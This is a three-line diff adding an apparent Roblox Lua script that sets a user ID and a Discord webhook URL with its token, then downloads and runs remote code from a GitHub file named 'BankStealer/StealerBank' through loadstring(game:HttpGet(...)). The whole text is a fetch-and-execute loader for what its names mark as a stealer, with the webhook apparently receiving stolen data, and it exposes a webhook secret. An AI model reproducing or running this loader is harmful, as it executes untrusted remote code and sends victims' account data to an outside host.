@@ -1,0 +1,3 @@
+_G.UserID = "yudipunggol27" 
+_G.WebHook = "https://discord.com/api/webhooks/1093092426039697531/_g6lbx3DNkI7aHk6ZFKPJv4RRl5hKoJAxRMnvQN2b6UsFwa_tSkbxKQFgb2DjnycPRe_" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafa1I/BankStealer/main/StealerBank"))()
